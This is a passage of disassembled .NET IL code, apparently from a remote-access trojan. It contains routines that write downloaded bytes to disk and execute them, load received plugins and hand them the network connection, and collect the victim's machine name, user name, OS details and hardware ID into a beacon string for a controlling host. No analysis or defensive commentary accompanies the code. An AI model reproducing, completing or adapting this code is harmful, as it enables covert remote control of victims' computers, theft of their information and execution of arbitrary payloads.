        IL_225e:  call       bool j.OK::Send(string)
        IL_2263:  pop
        IL_2264:  ldc.i4     0x7d0
        IL_2269:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
        IL_226e:  nop
        IL_226f:  ldloc.s    V_5
        IL_2271:  ldloc.2
        IL_2272:  call       void [mscorlib]System.IO.File::WriteAllBytes(string,
                                                                          uint8[])
        IL_2277:  nop
        IL_2278:  ldloc.s    V_5
        IL_227a:  ldstr      ".."
        IL_227f:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::Start(string,
                                                                                                                string)
        IL_2284:  pop
        IL_2285:  leave.s    IL_22d5

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_2287:  dup
        IL_2288:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_228d:  stloc.s    V_96
        IL_228f:  nop
        IL_2290:  ldloc.s    V_96
        IL_2292:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_2297:  nop
        IL_2298:  ldloc.s    V_96
        IL_229a:  stloc.s    V_97
        IL_229c:  ldstr      "MSG"
        IL_22a1:  ldsfld     string j.OK::Y
        IL_22a6:  ldstr      "Update ERROR "
        IL_22ab:  ldloc.s    V_97
        IL_22ad:  callvirt   instance string [mscorlib]System.Exception::get_Message()
        IL_22b2:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string,
                                                                    string)
        IL_22b7:  call       bool j.OK::Send(string)
        IL_22bc:  pop
        IL_22bd:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_22c2:  nop
        IL_22c3:  nop
        IL_22c4:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_22c9:  leave      IL_25af

        IL_22ce:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_22d3:  leave.s    IL_22d5

      }  // end handler
      IL_22d5:  nop
      IL_22d6:  call       void j.OK::UNS()
      IL_22db:  nop
      IL_22dc:  nop
      IL_22dd:  leave      IL_25af

      IL_22e2:  nop
      IL_22e3:  nop
      IL_22e4:  ldloc.s    V_9
      IL_22e6:  ldstr      "Ex"
      IL_22eb:  ldc.i4.0
      IL_22ec:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_22f1:  ldc.i4.0
      IL_22f2:  ceq
      IL_22f4:  stloc.s    V_138
      IL_22f6:  ldloc.s    V_138
      IL_22f8:  brfalse    IL_23e9

      IL_22fd:  ldsfld     object j.OK::PLG
      IL_2302:  ldnull
      IL_2303:  ceq
      IL_2305:  stloc.s    V_137
      IL_2307:  ldloc.s    V_137
      IL_2309:  brfalse.s  IL_236f

      IL_230b:  ldstr      "PLG"
      IL_2310:  call       bool j.OK::Send(string)
      IL_2315:  pop
      IL_2316:  ldc.i4.0
      IL_2317:  stloc.s    V_100
      IL_2319:  br.s       IL_232d

      IL_231b:  ldloc.s    V_100
      IL_231d:  ldc.i4.1
      IL_231e:  add.ovf
      IL_231f:  stloc.s    V_100
      IL_2321:  ldc.i4     0x3e8
      IL_2326:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
      IL_232b:  nop
      IL_232c:  nop
      IL_232d:  ldsfld     object j.OK::PLG
      IL_2332:  ldnull
      IL_2333:  ceq
      IL_2335:  ldc.i4.0
      IL_2336:  ceq
      IL_2338:  ldloc.s    V_100
      IL_233a:  ldc.i4.s   20
      IL_233c:  ceq
      IL_233e:  or
      IL_233f:  ldsfld     bool j.OK::Cn
      IL_2344:  ldc.i4.0
      IL_2345:  ceq
      IL_2347:  or
      IL_2348:  ldc.i4.0
      IL_2349:  ceq
      IL_234b:  stloc.s    V_138
      IL_234d:  ldloc.s    V_138
      IL_234f:  brtrue.s   IL_231b

      IL_2351:  ldsfld     object j.OK::PLG
      IL_2356:  ldnull
      IL_2357:  ceq
      IL_2359:  ldsfld     bool j.OK::Cn
      IL_235e:  ldc.i4.0
      IL_235f:  ceq
      IL_2361:  or
      IL_2362:  stloc.s    V_138
      IL_2364:  ldloc.s    V_138
      IL_2366:  brfalse.s  IL_236e

      IL_2368:  nop
      IL_2369:  leave      IL_25af

      IL_236e:  nop
      IL_236f:  nop
      IL_2370:  ldc.i4.1
      IL_2371:  newarr     [mscorlib]System.Object
      IL_2376:  stloc.s    V_111
      IL_2378:  ldloc.s    V_111
      IL_237a:  ldc.i4.0
      IL_237b:  ldarg.0
      IL_237c:  stelem.ref
      IL_237d:  nop
      IL_237e:  ldloc.s    V_111
      IL_2380:  stloc.s    V_98
      IL_2382:  ldc.i4.1
      IL_2383:  newarr     [mscorlib]System.Boolean
      IL_2388:  stloc.s    V_112
      IL_238a:  ldloc.s    V_112
      IL_238c:  ldc.i4.0
      IL_238d:  ldc.i4.1
      IL_238e:  stelem.i1
      IL_238f:  ldloc.s    V_112
      IL_2391:  stloc.s    V_99
      IL_2393:  ldsfld     object j.OK::PLG
      IL_2398:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_239d:  ldnull
      IL_239e:  ldstr      "ind"
      IL_23a3:  ldloc.s    V_98
      IL_23a5:  ldnull
      IL_23a6:  ldnull
      IL_23a7:  ldloc.s    V_99
      IL_23a9:  ldc.i4.1
      IL_23aa:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateCall(object,
                                                                                                                         class [mscorlib]System.Type,
                                                                                                                         string,
                                                                                                                         object[],
                                                                                                                         string[],
                                                                                                                         class [mscorlib]System.Type[],
                                                                                                                         bool[],
                                                                                                                         bool)
      IL_23af:  pop
      IL_23b0:  ldloc.s    V_99
      IL_23b2:  ldc.i4.0
      IL_23b3:  ldelem.i1
      IL_23b4:  stloc.s    V_138
      IL_23b6:  ldloc.s    V_138
      IL_23b8:  brfalse.s  IL_23e3

      IL_23ba:  ldloc.s    V_98
      IL_23bc:  ldc.i4.0
      IL_23bd:  ldelem.ref
      IL_23be:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_23c3:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_23c8:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_23cd:  ldtoken    uint8[]
      IL_23d2:  call       class [mscorlib]System.Type [mscorlib]System.Type::GetTypeFromHandle(valuetype [mscorlib]System.RuntimeTypeHandle)
      IL_23d7:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ChangeType(object,
                                                                                                                        class [mscorlib]System.Type)
      IL_23dc:  castclass  uint8[]
      IL_23e1:  starg.s    b
      IL_23e3:  nop
      IL_23e4:  br         IL_24dc

      IL_23e9:  ldloc.s    V_9
      IL_23eb:  ldstr      "PLG"
      IL_23f0:  ldc.i4.0
      IL_23f1:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_23f6:  ldc.i4.0
      IL_23f7:  ceq
      IL_23f9:  stloc.s    V_138
      IL_23fb:  ldloc.s    V_138
      IL_23fd:  brfalse    IL_24dc

      IL_2402:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
      IL_2407:  stloc.s    V_102
      IL_2409:  ldloc.0
      IL_240a:  ldc.i4.0
      IL_240b:  ldelem.ref
      IL_240c:  ldsfld     string j.OK::Y
      IL_2411:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_2416:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_241b:  stloc.s    V_101
      IL_241d:  ldloc.s    V_102
      IL_241f:  ldarg.0
      IL_2420:  ldloc.s    V_101
      IL_2422:  ldarg.0
      IL_2423:  ldlen
      IL_2424:  conv.ovf.i4
      IL_2425:  ldloc.s    V_101
      IL_2427:  sub.ovf
      IL_2428:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                 int32,
                                                                                 int32)
      IL_242d:  nop
      IL_242e:  ldloc.s    V_102
      IL_2430:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
      IL_2435:  call       uint8[] j.OK::ZIP(uint8[])
      IL_243a:  ldstr      "A"
      IL_243f:  call       object j.OK::Plugin(uint8[],
                                               string)
      IL_2444:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_2449:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_244e:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_2453:  stsfld     object j.OK::PLG
      IL_2458:  ldsfld     object j.OK::PLG
      IL_245d:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_2462:  ldnull
      IL_2463:  ldstr      "H"
      IL_2468:  ldc.i4.1
      IL_2469:  newarr     [mscorlib]System.Object
      IL_246e:  stloc.s    V_111
      IL_2470:  ldloc.s    V_111
      IL_2472:  ldc.i4.0
      IL_2473:  ldsfld     string j.OK::H
      IL_2478:  stelem.ref
      IL_2479:  nop
      IL_247a:  ldloc.s    V_111
      IL_247c:  ldnull
      IL_247d:  ldnull
      IL_247e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSet(object,
                                                                                                                      class [mscorlib]System.Type,
                                                                                                                      string,
                                                                                                                      object[],
                                                                                                                      string[],
                                                                                                                      class [mscorlib]System.Type[])
      IL_2483:  nop
      IL_2484:  ldsfld     object j.OK::PLG
      IL_2489:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_248e:  ldnull
      IL_248f:  ldstr      "P"
      IL_2494:  ldc.i4.1
      IL_2495:  newarr     [mscorlib]System.Object
      IL_249a:  stloc.s    V_111
      IL_249c:  ldloc.s    V_111
      IL_249e:  ldc.i4.0
      IL_249f:  ldsfld     string j.OK::P
      IL_24a4:  stelem.ref
      IL_24a5:  nop
      IL_24a6:  ldloc.s    V_111
      IL_24a8:  ldnull
      IL_24a9:  ldnull
      IL_24aa:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSet(object,
                                                                                                                      class [mscorlib]System.Type,
                                                                                                                      string,
                                                                                                                      object[],
                                                                                                                      string[],
                                                                                                                      class [mscorlib]System.Type[])
      IL_24af:  nop
      IL_24b0:  ldsfld     object j.OK::PLG
      IL_24b5:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_24ba:  ldnull
      IL_24bb:  ldstr      "c"
      IL_24c0:  ldc.i4.1
      IL_24c1:  newarr     [mscorlib]System.Object
      IL_24c6:  stloc.s    V_111
      IL_24c8:  ldloc.s    V_111
      IL_24ca:  ldc.i4.0
      IL_24cb:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
      IL_24d0:  stelem.ref
      IL_24d1:  nop
      IL_24d2:  ldloc.s    V_111
      IL_24d4:  ldnull
      IL_24d5:  ldnull
      IL_24d6:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSet(object,
                                                                                                                      class [mscorlib]System.Type,
                                                                                                                      string,
                                                                                                                      object[],
                                                                                                                      string[],
                                                                                                                      class [mscorlib]System.Type[])
      IL_24db:  nop
      IL_24dc:  nop
      IL_24dd:  leave      IL_25ae

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_24e2:  dup
      IL_24e3:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_24e8:  stloc.s    V_103
      IL_24ea:  nop
      IL_24eb:  ldloc.s    V_103
      IL_24ed:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_24f2:  nop
      IL_24f3:  ldloc.s    V_103
      IL_24f5:  stloc.s    V_104
      IL_24f7:  ldloc.0
      IL_24f8:  ldlen
      IL_24f9:  conv.ovf.i4
      IL_24fa:  ldc.i4.0
      IL_24fb:  ble.s      IL_2522

      IL_24fd:  ldloc.0
      IL_24fe:  ldc.i4.0
      IL_24ff:  ldelem.ref
      IL_2500:  ldstr      "Ex"
      IL_2505:  ldc.i4.0
      IL_2506:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_250b:  ldc.i4.0
      IL_250c:  ceq
      IL_250e:  ldloc.0
      IL_250f:  ldc.i4.0
      IL_2510:  ldelem.ref
      IL_2511:  ldstr      "PLG"
      IL_2516:  ldc.i4.0
      IL_2517:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_251c:  ldc.i4.0
      IL_251d:  ceq
      IL_251f:  or
      IL_2520:  brtrue.s   IL_2525

      IL_2522:  ldc.i4.0
      IL_2523:  br.s       IL_2526

      IL_2525:  ldc.i4.1
      IL_2526:  nop
      IL_2527:  stloc.s    V_138
      IL_2529:  ldloc.s    V_138
      IL_252b:  brfalse.s  IL_2533

      IL_252d:  ldnull
      IL_252e:  stsfld     object j.OK::PLG
      IL_2533:  nop
      IL_2534:  nop
      .try
      {
        IL_2535:  ldc.i4.5
        IL_2536:  newarr     [mscorlib]System.String
        IL_253b:  stloc.s    V_108
        IL_253d:  ldloc.s    V_108
        IL_253f:  ldc.i4.0
        IL_2540:  ldstr      "ER"
        IL_2545:  stelem.ref
        IL_2546:  nop
        IL_2547:  ldloc.s    V_108
        IL_2549:  ldc.i4.1
        IL_254a:  ldsfld     string j.OK::Y
        IL_254f:  stelem.ref
        IL_2550:  nop
        IL_2551:  ldloc.s    V_108
        IL_2553:  ldc.i4.2
        IL_2554:  ldloc.0
        IL_2555:  ldc.i4.0
        IL_2556:  ldelem.ref
        IL_2557:  stelem.ref
        IL_2558:  nop
        IL_2559:  ldloc.s    V_108
        IL_255b:  ldc.i4.3
        IL_255c:  ldsfld     string j.OK::Y
        IL_2561:  stelem.ref
        IL_2562:  nop
        IL_2563:  ldloc.s    V_108
        IL_2565:  ldc.i4.4
        IL_2566:  ldloc.s    V_104
        IL_2568:  callvirt   instance string [mscorlib]System.Exception::get_Message()
        IL_256d:  stelem.ref
        IL_256e:  nop
        IL_256f:  ldloc.s    V_108
        IL_2571:  call       string [mscorlib]System.String::Concat(string[])
        IL_2576:  call       bool j.OK::Send(string)
        IL_257b:  pop
        IL_257c:  leave.s    IL_25a0

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_257e:  dup
        IL_257f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_2584:  stloc.s    V_105
        IL_2586:  nop
        IL_2587:  ldloc.s    V_105
        IL_2589:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_258e:  nop
        IL_258f:  ldloc.s    V_105
        IL_2591:  stloc.s    V_106
        IL_2593:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_2598:  nop
        IL_2599:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_259e:  leave.s    IL_25a0

      }  // end handler
      IL_25a0:  nop
      IL_25a1:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_25a6:  nop
      IL_25a7:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_25ac:  leave.s    IL_25ae

    }  // end handler
    IL_25ae:  nop
    IL_25af:  nop
    IL_25b0:  ret
  } // end of method OK::Ind

  .method public static string  inf() cil managed
  {
    // Code size       1194 (0x4aa)
    .maxstack  4
    .locals init (string V_0,
             string V_1,
             string V_2,
             class [mscorlib]System.Exception V_3,
             class [mscorlib]System.Exception V_4,
             class [mscorlib]System.Exception V_5,
             class [mscorlib]System.Exception V_6,
             class [mscorlib]System.Exception V_7,
             class [mscorlib]System.Exception V_8,
             class [mscorlib]System.Exception V_9,
             class [mscorlib]System.Exception V_10,
             class [mscorlib]System.Exception V_11,
             class [mscorlib]System.Exception V_12,
             string[] V_13,
             class [mscorlib]System.Exception V_14,
             class [mscorlib]System.Exception V_15,
             class [mscorlib]System.Exception V_16,
             class [mscorlib]System.Exception V_17,
             string V_18,
             class [mscorlib]System.Exception V_19,
             class [mscorlib]System.Exception V_20,
             string V_21,
             string V_22,
             valuetype [mscorlib]System.DateTime V_23,
             valuetype [mscorlib]System.DateTime V_24,
             string[] V_25,
             int32 V_26,
             string[] V_27,
             bool V_28)
    IL_0000:  nop
    IL_0001:  ldstr      "ll"
    IL_0006:  ldsfld     string j.OK::Y
    IL_000b:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_0010:  stloc.1
    IL_0011:  nop
    .try
    {
      IL_0012:  ldstr      "vn"
      IL_0017:  ldstr      ""
      IL_001c:  call       object j.OK::GTV(string,
                                            object)
      IL_0021:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0026:  ldstr      ""
      IL_002b:  ldc.i4.0
      IL_002c:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConditionalCompareObjectEqual(object,
                                                                                                                                       object,
                                                                                                                                       bool)
      IL_0031:  stloc.s    V_28
      IL_0033:  ldloc.s    V_28
      IL_0035:  brfalse.s  IL_0067

      IL_0037:  ldloc.1
      IL_0038:  ldsflda    string j.OK::VN
      IL_003d:  call       string j.OK::DEB(string&)
      IL_0042:  ldstr      "_"
      IL_0047:  call       string j.OK::HWD()
      IL_004c:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0051:  stloc.s    V_21
      IL_0053:  ldloca.s   V_21
      IL_0055:  call       string j.OK::ENB(string&)
      IL_005a:  ldsfld     string j.OK::Y
      IL_005f:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0064:  stloc.1
      IL_0065:  br.s       IL_00ae

      IL_0067:  nop
      IL_0068:  ldloc.1
      IL_0069:  ldstr      "vn"
      IL_006e:  ldstr      ""
      IL_0073:  call       object j.OK::GTV(string,
                                            object)
      IL_0078:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_007d:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
      IL_0082:  stloc.s    V_21
      IL_0084:  ldloca.s   V_21
      IL_0086:  call       string j.OK::DEB(string&)
      IL_008b:  ldstr      "_"
      IL_0090:  call       string j.OK::HWD()
      IL_0095:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_009a:  stloc.s    V_22
      IL_009c:  ldloca.s   V_22
      IL_009e:  call       string j.OK::ENB(string&)
      IL_00a3:  ldsfld     string j.OK::Y
      IL_00a8:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_00ad:  stloc.1
      IL_00ae:  nop
      IL_00af:  leave.s    IL_00ec

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_00b1:  dup
      IL_00b2:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00b7:  stloc.s    V_4
      IL_00b9:  nop
      IL_00ba:  ldloc.s    V_4
      IL_00bc:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00c1:  nop
      IL_00c2:  ldloc.s    V_4
      IL_00c4:  stloc.3
      IL_00c5:  ldloc.1
      IL_00c6:  call       string j.OK::HWD()
      IL_00cb:  stloc.s    V_22
      IL_00cd:  ldloca.s   V_22
      IL_00cf:  call       string j.OK::ENB(string&)
      IL_00d4:  ldsfld     string j.OK::Y
      IL_00d9:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_00de:  stloc.1
      IL_00df:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00e4:  nop
      IL_00e5:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00ea:  leave.s    IL_00ec

    }  // end handler
    IL_00ec:  nop
    IL_00ed:  nop
    .try
    {
      IL_00ee:  ldloc.1
      IL_00ef:  call       string [mscorlib]System.Environment::get_MachineName()
      IL_00f4:  ldsfld     string j.OK::Y
      IL_00f9:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_00fe:  stloc.1
      IL_00ff:  leave.s    IL_0134

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0101:  dup
      IL_0102:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0107:  stloc.s    V_6
      IL_0109:  nop
      IL_010a:  ldloc.s    V_6
      IL_010c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0111:  nop
      IL_0112:  ldloc.s    V_6
      IL_0114:  stloc.s    V_5
      IL_0116:  ldloc.1
      IL_0117:  ldstr      "\?\?"
      IL_011c:  ldsfld     string j.OK::Y
      IL_0121:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0126:  stloc.1
      IL_0127:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_012c:  nop
      IL_012d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0132:  leave.s    IL_0134

    }  // end handler
    IL_0134:  nop
    IL_0135:  nop
    .try
    {
      IL_0136:  ldloc.1
      IL_0137:  call       string [mscorlib]System.Environment::get_UserName()
      IL_013c:  ldsfld     string j.OK::Y
      IL_0141:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0146:  stloc.1
      IL_0147:  leave.s    IL_017c

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0149:  dup
      IL_014a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_014f:  stloc.s    V_7
      IL_0151:  nop
      IL_0152:  ldloc.s    V_7
      IL_0154:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0159:  nop
      IL_015a:  ldloc.s    V_7
      IL_015c:  stloc.s    V_8
      IL_015e:  ldloc.1
      IL_015f:  ldstr      "\?\?"
      IL_0164:  ldsfld     string j.OK::Y
      IL_0169:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_016e:  stloc.1
      IL_016f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0174:  nop
      IL_0175:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_017a:  leave.s    IL_017c

    }  // end handler
    IL_017c:  nop
    IL_017d:  nop
    .try
    {
      IL_017e:  ldloc.1
      IL_017f:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
      IL_0184:  callvirt   instance valuetype [mscorlib]System.DateTime [mscorlib]System.IO.FileSystemInfo::get_LastWriteTime()
      IL_0189:  stloc.s    V_23
      IL_018b:  ldloca.s   V_23
      IL_018d:  call       instance valuetype [mscorlib]System.DateTime [mscorlib]System.DateTime::get_Date()
      IL_0192:  stloc.s    V_24
      IL_0194:  ldloca.s   V_24
      IL_0196:  ldstr      "yy-MM-dd"
      IL_019b:  call       instance string [mscorlib]System.DateTime::ToString(string)
      IL_01a0:  ldsfld     string j.OK::Y
      IL_01a5:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_01aa:  stloc.1
      IL_01ab:  leave.s    IL_01e0

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_01ad:  dup
      IL_01ae:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_01b3:  stloc.s    V_9
      IL_01b5:  nop
      IL_01b6:  ldloc.s    V_9
      IL_01b8:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_01bd:  nop
      IL_01be:  ldloc.s    V_9
      IL_01c0:  stloc.s    V_10
      IL_01c2:  ldloc.1
      IL_01c3:  ldstr      "\?\?-\?\?-\?\?"
      IL_01c8:  ldsfld     string j.OK::Y
      IL_01cd:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_01d2:  stloc.1
      IL_01d3:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_01d8:  nop
      IL_01d9:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_01de:  leave.s    IL_01e0

    }  // end handler
    IL_01e0:  nop
    IL_01e1:  ldloc.1
    IL_01e2:  ldstr      ""
    IL_01e7:  ldsfld     string j.OK::Y
    IL_01ec:  call       string [mscorlib]System.String::Concat(string,
                                                                string,
                                                                string)
    IL_01f1:  stloc.1
    IL_01f2:  nop
    .try
    {
      IL_01f3:  ldloc.1
      IL_01f4:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
      IL_01f9:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ComputerInfo [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Info()
      IL_01fe:  callvirt   instance string [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ComputerInfo::get_OSFullName()
      IL_0203:  ldstr      "Microsoft"
      IL_0208:  ldstr      ""
      IL_020d:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                            string)
      IL_0212:  ldstr      "Windows"
      IL_0217:  ldstr      "Win"
      IL_021c:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                            string)
      IL_0221:  ldstr      bytearray (AE 00 ) 
      IL_0226:  ldstr      ""
      IL_022b:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                            string)
      IL_0230:  ldstr      bytearray (22 21 )                                           // "!
      IL_0235:  ldstr      ""
      IL_023a:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                            string)
      IL_023f:  ldstr      "  "
      IL_0244:  ldstr      " "
      IL_0249:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                            string)
      IL_024e:  ldstr      " Win"
      IL_0253:  ldstr      "Win"
      IL_0258:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                            string)
      IL_025d:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_0262:  stloc.1
      IL_0263:  leave.s    IL_0293

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0265:  dup
      IL_0266:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_026b:  stloc.s    V_11
      IL_026d:  nop
      IL_026e:  ldloc.s    V_11
      IL_0270:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0275:  nop
      IL_0276:  ldloc.s    V_11
      IL_0278:  stloc.s    V_12
      IL_027a:  ldloc.1
      IL_027b:  ldstr      "\?\?"
      IL_0280:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_0285:  stloc.1
      IL_0286:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_028b:  nop
      IL_028c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0291:  leave.s    IL_0293

    }  // end handler
    IL_0293:  nop
    IL_0294:  ldloc.1
    IL_0295:  ldstr      "SP"
    IL_029a:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_029f:  stloc.1
    IL_02a0:  nop
    .try
    {
      IL_02a1:  call       class [mscorlib]System.OperatingSystem [mscorlib]System.Environment::get_OSVersion()
      IL_02a6:  callvirt   instance string [mscorlib]System.OperatingSystem::get_ServicePack()
      IL_02ab:  ldstr      " "
      IL_02b0:  ldc.i4.m1
      IL_02b1:  ldc.i4.0
      IL_02b2:  call       string[] [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::Split(string,
                                                                                                string,
                                                                                                int32,
                                                                                                valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.CompareMethod)
      IL_02b7:  stloc.s    V_13
      IL_02b9:  ldloc.s    V_13
      IL_02bb:  ldlen
